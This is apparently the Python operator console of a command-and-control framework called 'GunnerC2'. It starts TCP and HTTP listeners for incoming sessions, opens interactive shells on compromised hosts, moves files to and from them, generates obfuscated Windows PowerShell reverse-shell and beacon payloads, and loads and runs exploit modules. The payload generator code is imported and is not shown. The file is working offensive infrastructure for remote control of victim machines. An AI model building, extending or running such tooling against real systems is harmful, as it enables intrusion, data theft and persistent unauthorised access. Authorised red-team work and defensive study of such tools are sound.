#!/usr/bin/env python3

import sys
import threading
import readline
import os
import shlex
import argparse
import subprocess

from core.module_loader import load_module
from core.module_loader import search_modules
from core import http_handler, tcp_listener, shell, session_manager, utils, banner

from core.payload_generator import *
from core.banner import print_banner

from colorama import init, Fore, Style
brightgreen = Style.BRIGHT + Fore.GREEN
brightyellow = Style.BRIGHT + Fore.YELLOW
brightred = Style.BRIGHT + Fore.RED
brightblue = Style.BRIGHT + Fore.BLUE

PROMPT = brightblue + "GunnerC2 > "


def bind_keys():
    readline.parse_and_bind('"\\C-l": clear-screen')

def operator_loop():
    bind_keys()
    while True:
        user = input(PROMPT).strip()

        if not user:
            continue

        elif user == "\x0c":  # Control+L
            os.system("clear")
            continue

         # --- Help system ---
        elif user.startswith("help"):
            parts = shlex.split(user)

            if len(parts) == 1:
                utils.print_help()

            elif len(parts) == 2:
                utils.print_help(parts[1])

            elif len(parts) == 3:
                utils.print_help(parts[2])

            else:
                print(brightyellow + "Usage: help or help <command> [subcommand]")

            continue

        elif user.startswith("banner"):
            os.system("clear")
            print_banner()
            continue

        ### Download command parsing
        elif user.startswith("download"):
            try:
                try:
                    args = shlex.split(user)
                    parser = argparse.ArgumentParser(prog="download", add_help=False)
                    parser.add_argument("-i", required=True)
                    parser.add_argument("-f", required=True)
                    parser.add_argument("-o", required=True)
                    parsed_args = parser.parse_args(args[1:])

                except Exception as e:
                    continue

                #sid = parsed_args.i
                raw_id = parsed_args.i
                sid = session_manager.resolve_sid(raw_id)
                session = session_manager.sessions[sid]
                meta = session.metadata
                operatingsystem = meta.get("os", "").lower()

                if not sid:
                    print(brightred + f"Invalid session or alias: {raw_id}")
                    continue

                remote_file = parsed_args.f

                if "\\" not in remote_file and operatingsystem == "windows":
                    print(brightred + "Use double backslashes when specifying file paths.")
                    continue

                local_file = parsed_args.o

                """if sid not in session_manager.sessions:
                    print(f"Invalid session ID: {sid}")
                    continue"""

                if session_manager.is_http_session(sid):
                    shell.download_file_http(sid, remote_file, local_file)

                else:
                    shell.download_file_tcp(sid, remote_file, local_file)

            except SystemExit:
                print(brightgreen + "Run help for info: help or help <command> [subcommand]")
                #print(utils.commands["download"])

            except Exception as e:
                print(brightred + f"Error parsing arguments: {e}")
            continue


        elif user.startswith("upload"):
            try:
                parts = user.split()
                if len(parts) < 7:
                    print(brightyellow + "Usage: upload -i <session_id> -l <local_file> -r <remote_file>")

                try:
                    raw_sid = parts[parts.index("-i") + 1]
                    local_file = parts[parts.index("-l") + 1]
                    remote_file = parts[parts.index("-r") + 1]
                    try:
                        unformatted_sid = session_manager.resolve_sid(raw_sid)
                        sid = str(unformatted_sid)

                    except Exception as e:
                        print(brightred + f"Invalid session or alias: {raw_sid}")

                    session = session_manager.sessions[sid]
                    meta = session.metadata
                except Exception as e:
                    print(brightred + f"ERROR: {e}")

                if "\\" not in remote_file and meta.get("os", "").lower() == "windows":
                    print(brightred + "Use double backslashes when specifying file paths.")
                    continue

                
                if not sid:
                    print(brightred + f"Invalid session or alias: {raw_id}")
                    continue

                """if sid not in session_manager.sessions:
                    print("Invalid session ID.")
                    continue"""


                if session_manager.is_http_session(sid):
                    shell.upload_file_http(sid, local_file, remote_file)
                elif session_manager.is_tcp_session(sid):
                    shell.upload_file_tcp(sid, local_file, remote_file)
                else:
                    print(brightred + "Unknown session type.")

            except:
                continue
                #print("Usage: upload -i <session_id> -l <local_file> -r <remote_file>")
                

        elif user.startswith("start http"):
            try:
                _, _, ip, port = user.split()
                port = int(port)
                threading.Thread(target=http_handler.start_http_listener, args=(ip, port), daemon=True).start()
            except:
                print(brightyellow + "Usage: start http <ip> <port>")

        elif user.startswith("start tcp"):
            try:
                _, _, ip, port = user.split()
                port = int(port)
                threading.Thread(target=tcp_listener.start_tcp_listener, args=(ip, port), daemon=True).start()
            except:
                print(brightyellow + "Usage: start tcp <ip> <port>")

        elif user == "listeners":
            utils.list_listeners()

        elif user == "sessions":
            utils.list_sessions()

        elif user.startswith("shell"):
            try:
                _, sid = user.split()
                real_sid = session_manager.resolve_sid(sid)
                if real_sid:
                    if session_manager.is_http_session(real_sid):
                        shell.interactive_http_shell(real_sid)
                    elif session_manager.is_tcp_session(real_sid):
                        shell.interactive_tcp_shell(real_sid)
                    else:
                        print(brightred + "Unknown session type.")
                else:
                    print(brightred + "Invalid session ID.")
            except Exception as e:
                print(e)
                print(brightyellow + "Usage: shell <session_id>")

        elif user.startswith("alias"):
            parts = shlex.split(user)
            if len(parts) != 3:
                print(brightyellow + "Usage: alias <OLD_SID_or_ALIAS> <NEW_ALIAS>")
                continue

            old, new = parts[1], parts[2]
            real = session_manager.resolve_sid(old)
            if not real:
                print(brightred + f"No such session or alias: {old}")
                continue

            session_manager.set_alias(new, real)
            print(brightgreen + f"Alias set: {new!r} → {real}")
            continue

        elif user.startswith("generate"):
            # Split input
            parts = shlex.split(user)

            if "-p" not in parts:
                print(brightyellow + "You must specify payload type first with -p")
                continue

            # Extract payload type early
            payload_index = parts.index("-p") + 1
            payload_type = parts[payload_index]

            #### Profile-based parsing starts here ####

            if payload_type == "tcp-win":
                parser = argparse.ArgumentParser(prog="generate (tcp-win)", add_help=False)
                parser.add_argument("-f", "--format", choices=["ps1"], required=True)
                parser.add_argument("-obs", "--obfuscation", type=int, choices=[1, 2, 3], required=False)
                parser.add_argument("-p", "--payload", choices=["tcp-win"], required=True)
                parser.add_argument("-o", "--output", required=True)
                parser.add_argument("-lh", "--local_host", required=True)
                parser.add_argument("-lp", "--local_port", required=True)

            elif payload_type == "http-win":
                parser = argparse.ArgumentParser(prog="generate (http-win)", add_help=False)
                parser.add_argument("-f", "--format", choices=["ps1"], required=True)
                parser.add_argument("-obs", "--obfuscation", type=int, choices=[1, 2, 3], required=False)
                parser.add_argument("-p", "--payload", choices=["http-win"], required=True)
                parser.add_argument("-o", "--output", required=True)
                parser.add_argument("-lh", "--local_host", required=True)
                parser.add_argument("-lp", "--local_port", required=True)
                parser.add_argument("--beacon_interval", required=True)

            else:
                print(brightred + f"Unknown payload type: {payload_type}")
                continue

            # Parse remaining args
            try:
                args = parser.parse_args(parts[1:])
            except SystemExit:
                print(brightyellow + utils.commands["generate"])
                continue

            # Call generators
            if args.payload == "tcp-win":
                raw = generate_windows_powershell_tcp(args.local_host, args.local_port, args.obfuscation)

            elif args.payload == "http-win":
                raw = generate_windows_powershell_http(args.local_host, args.local_port, args.beacon_interval, args.obfuscation)

            with open(args.output, "w") as f:
                f.write(raw)

            print(brightgreen + f"[+] Payload written to {args.output}")
            continue

        elif user.startswith("search"):
            parts = user.split()
            if len(parts) < 2:
                utils.print_help(parts[0])

            elif parts[1] in ("all", "ALL"):
                modules = search_modules()
                for m in modules:
                    print(brightgreen + f"[*] {m}")

            elif len(parts) > 2:
                print(brightred + f"[-] ERROR too many arguments for search command.")
                utils.print_help(parts[0])

            elif len(parts) == 2 and parts[1] not in ("ALL", "all"):
                keyword = parts[1]
                modules = search_modules(keyword)

                if modules is None:
                    print(brightred + f"[-] ERROR failed to find module matching the keyword {keyword}")

                else:
                    for m in modules:
                        print(brightgreen + f"[*] {m}")

            else:
                try:
                    utils.print_help(parts[0])

                except Exception as e:
                    print(brightred + f"[-] ERROR an unknown error as ocurred: {e}")

        elif user.startswith("use"):
            parts = user.split()
            if len(parts) != 2:
                print(brightyellow + "Usage: use <module_name>")
                continue

            modname = parts[1]
            current_module = load_module(modname)
    
            if not current_module:
                continue

            while True:
                subcmd = input(brightblue + f"module({current_module.name}) > ").strip()

                if not subcmd:
                    continue
        
                if subcmd in ("back", "exit", "quit", "leave"):
                    break

                elif subcmd == "show options":
                    current_module.show_options()

                elif subcmd == "info":
                    print(brightyellow + f"\nModule: {current_module.name}\n")
                    print(brightgreen + f"Description: {current_module.description}\n")
                    current_module.show_options()

                elif subcmd.startswith("set "):
                    _, key, val = subcmd.split(" ", 2)

                    try:
                        current_module.set_option(key, val)

                    except KeyError as e:
                        print(e)

                elif subcmd in ("run", "exploit", "RUN", "EXPLOIT", "pwn", "PWN"):
                    try:
                        check = current_module.validate()
                        if check is True:
                            current_module.run()

                        elif check is not True:
                            print(brightred + f"[!] Missing required options: {', '.join(check)}")

                    except Exception as e:
                        print(brightred + f"[-] ERROR failed to run argument check: {e}\n")
                        print(brightred + "Try running the command again.")

                elif subcmd in ("help", "?"):
                    print(brightyellow + "\nModule Help Menu:\n")
                    print(brightgreen + f"""
show options         - View all configurable options for this module
set <option> <val>   - Set a value for a required or optional field
run                  - Execute the module logic using configured options
info                 - Display module metadata including description and options
back                 - Exit module and return to main C2 prompt
help                 - Display this help menu
""")

                else:
                    print(brightred + f"Unknown command: {subcmd}")
                    print(brightyellow + "Type 'help' to see available commands.")


        elif user in ("exit", "quit"):
            utils.shutdown()
            print(brightyellow + "Exiting.")
            exit(0)

        else:
            #print("TEST")
            print(brightred + "Unknown command.")

if __name__ == "__main__":
    # NO MORE PRINTER THREAD
    print_banner()
    operator_loop()
